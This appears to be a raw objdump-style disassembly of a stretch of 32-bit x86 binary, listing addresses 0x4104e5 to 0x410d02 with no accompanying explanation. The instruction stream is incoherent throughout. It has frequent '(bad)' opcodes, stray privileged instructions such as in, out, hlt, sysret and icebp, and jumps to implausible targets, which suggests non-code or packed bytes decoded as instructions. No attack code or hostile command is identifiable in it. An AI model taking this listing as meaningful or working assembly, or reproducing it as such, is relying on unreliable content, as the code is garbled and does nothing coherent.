  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
